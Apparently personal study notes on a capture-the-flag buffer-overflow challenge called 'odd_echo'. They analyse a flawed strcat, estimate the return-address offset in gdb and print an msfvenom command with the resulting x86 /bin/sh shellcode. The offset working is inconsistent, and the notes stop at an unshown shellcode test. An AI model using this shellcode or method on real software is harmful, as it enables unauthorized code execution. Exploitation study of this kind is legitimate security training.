![[Pasted image 20260629145317.png]]
![[Pasted image 20260629145359.png]]
![[Pasted image 20260629145410.png]]
![[Pasted image 20260629145502.png]]


# Understand odd_echo

![[Pasted image 20260629151232.png]]
![[Pasted image 20260629151349.png]]

# Understand odd_echo code. 
![[Pasted image 20260629145924.png]]
![[Pasted image 20260629145941.png]]

it takes the argv which is sent to the main function if less than two it gives an error then the main function does echo call where the char arg is passed to char *s there is a defined buf[10]= which is 8 bytes long. then strcat function is being called where buf and s is passed.  


function my_strcat does this. 

int len = strlen(dst);   // len = 8 ("--ECHO: " is 8 chars)
dst += len;              // moves pointer to buf[8] (end of "--ECHO: ")

while (*src) {           // copy until null byte
    if (*src == 0x31)    // 0x31 = ASCII '1' ← THIS IS THE ODD STOP CHARACTER
        break;
    *dst = *src;         // copy byte
    ++dst; ++src;        // advance both pointers
}

## Important point to not here it ends at 1 and not 0. So if i pass 1 it will end and not 0. 


buf[10] = "--ECHO: \0"
           01234567 8  9
                    ↑
           my_strcat starts writing HERE
           only 2 bytes before overflow!
           
if i pass more than 8 charachters. I get segmentation fault. 

![[Pasted image 20260701143835.png]]

# Calculating offset at echo 

We are choosing echo because one this is where the size is declared and it gets passed to strcat for declaration.

disas echo      → tells you WHERE the buffer is (the offset from %ebp)
my_strcat       → is WHERE the writing happens (but no buffer declared there)

![[Pasted image 20260701150255.png]]

So the buffer starts at ebp - decimal(18) 0x12 

To structure my payload I need 18 + 4 bytes (saved ebp)

# Controlling return address

r $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*18 + b"AAAA" )')

I see this 
![[Pasted image 20260701152133.png]]

![[Pasted image 20260701152344.png]]
crash should show 0x44434241, that means it has overran the past address. 
![[Pasted image 20260701153309.png]]

![[Pasted image 20260701153450.png]]

Now I only see 55 and not 41 I should be able to see the 41 for that I will try reducing the number of buffer. when i do 17 i can see a A

![[Pasted image 20260701153721.png]]

I will keep reducing it till i see 44434241 it is 14. 

![[Pasted image 20260701153943.png]]

So the final payload structure is \x55 * 14

# Prepare Shellcode


https://medium.com/@kisalnelaka6/demystifying-shellcode-generation-a-guide-for-beginners-e8b536599296

[hacker22@warhead chal6]$ msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x31' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No badchars present in payload, skipping automatic encoding
No encoder specified, outputting raw payload
Payload size: 43 bytes
Final size of python file: 227 bytes
buf =  b""
buf += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68"
buf += b"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52"
buf += b"\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += b"\x00\x57\x53\x89\xe1\xcd\x80"
[hacker22@warhead chal6]$

\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80


## Testing the shellcode 


![[Pasted image 20260701162126.png]]

![[Pasted image 20260701162158.png]]
